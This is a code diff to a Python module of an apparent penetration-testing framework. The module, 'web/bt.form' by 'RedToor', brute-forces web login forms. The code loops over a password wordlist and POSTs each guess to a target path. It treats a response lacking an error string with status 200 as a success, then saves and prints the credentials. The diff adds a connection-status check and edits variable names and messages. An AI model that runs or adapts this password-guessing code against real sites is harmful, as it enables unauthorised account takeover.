@@ -19,20 +19,20 @@ import time                   #
 # INFORMATION MODULE
 def initialize():
 	initialize.Author             ="RedToor"
-	initialize.Version            ="1.1"
+	initialize.Version            ="1.2"
 	initialize.Despcription       ="Brute Force to Form-based in Webs application."
 	initialize.CodeName           ="web/bt.form"
 	initialize.DateCreation       ="28/02/2015"      
-	initialize.LastModification   ="24/03/2016"
+	initialize.LastModification   ="30/04/2016"
 
 	# DEFAULT VARIABLES             VALUE                  NAME        RQ     DESCRIPTION
 	initialize.DEFAULT_VARIABLE   =[[LOCAL_IP            , "target" , "yes" , "IP or DNS"]]         #[0][0]
 	initialize.DEFAULT_VARIABLE  +=[[HTTP_PORT           , "port"   , "no"  , "Service port"]]      #[1][0]
-	initialize.DEFAULT_VARIABLE  +=[["/KatanaLAB/run.php", "patch"  , "yes" , "File patch"]]        #[2][0]
-	initialize.DEFAULT_VARIABLE  +=[[USERNAME            , "value1" , "yes" , "Username target"]]   #[3][0]
-	initialize.DEFAULT_VARIABLE  +=[[DITIONARY_PASSWORDS , "value2" , "no"  , "Wordlist"]]          #[4][0]
-	initialize.DEFAULT_VARIABLE  +=[["username"          , "data_a" , "yes" , "Name value1"]]       #[5][0]
-	initialize.DEFAULT_VARIABLE  +=[["password"          , "data_b" , "yes" , "Name value2"]]       #[6][0]
+	initialize.DEFAULT_VARIABLE  +=[["/KatanaLAB/run.php", "path"   , "yes" , "File patch"]]        #[2][0]
+	initialize.DEFAULT_VARIABLE  +=[[USERNAME            , "user"   , "yes" , "Username target"]]   #[3][0]
+	initialize.DEFAULT_VARIABLE  +=[[DITIONARY_PASSWORDS , "dict"   , "no"  , "Wordlist"]]          #[4][0]
+	initialize.DEFAULT_VARIABLE  +=[["username"          , "data_a" , "yes" , "Name value 1"]]      #[5][0]
+	initialize.DEFAULT_VARIABLE  +=[["password"          , "data_b" , "yes" , "Name value 2"]]      #[6][0]
 	initialize.DEFAULT_VARIABLE  +=[["POST"              , "method" , "yes" , "Method form"]]       #[7][0]
 	initialize.DEFAULT_VARIABLE  +=[["Wrong"             , "alert"  , "yes" , "error login"]]       #[8][0]
 initialize()
@@ -56,6 +56,7 @@ def main(run):
 				if True:
 					try:
 						Message.loading_file()
+						Testrequestcode = True
 						with open(initialize.DEFAULT_VARIABLE[4][0],'r') as passwords:
 							for password in passwords:
 								password=password.replace("\n","")
@@ -65,12 +66,17 @@ def main(run):
 								conn.request(initialize.DEFAULT_VARIABLE[7][0], initialize.DEFAULT_VARIABLE[2][0], params, header)
 								response = conn.getresponse()
 								ver_source = response.read()
-								if ver_source.find(initialize.DEFAULT_VARIABLE[8][0]) <= 0:
+								Status = getFunction.checkStatus(response.status)
+								if (Testrequestcode==True) : print " "+Alr+" Connection testing:"+initialize.DEFAULT_VARIABLE[0][0]+" "+Status[1]+" Des:"+Status[0]
+								if (Status[1]=="Err:Client" or Status[1]=="Err:Server") : break
+								Testrequestcode = False
+								if ver_source.find(initialize.DEFAULT_VARIABLE[8][0]) <= 0 and response.status == 200:
 									getFunction.savefour("BruteForceFormBase",initialize.DEFAULT_VARIABLE[0][0],initialize.DEFAULT_VARIABLE[1][0],initialize.DEFAULT_VARIABLE[2][0],initialize.DEFAULT_VARIABLE[7][0],initialize.DEFAULT_VARIABLE[5][0],initialize.DEFAULT_VARIABLE[6][0],initialize.DEFAULT_VARIABLE[3][0],password)
 									print "\n-"+Suf+" Successfully with ["+initialize.DEFAULT_VARIABLE[5][0]+"="+initialize.DEFAULT_VARIABLE[3][0]+"]["+initialize.DEFAULT_VARIABLE[6][0]+"="+password+"]\n"
 									main(True)
 								else:
-									print " "+Alr+" Checking ("+initialize.DEFAULT_VARIABLE[6][0]+"="+initialize.DEFAULT_VARIABLE[3][0]+")("+initialize.DEFAULT_VARIABLE[7][0]+"="+password+")"
+									print " "+Alr+" testing with the password: "+password
+						Message.Noresult()
 					except:
 						Errors.Errors(event=sys.exc_info(), info=initialize.DEFAULT_VARIABLE[4][0])
 			except:
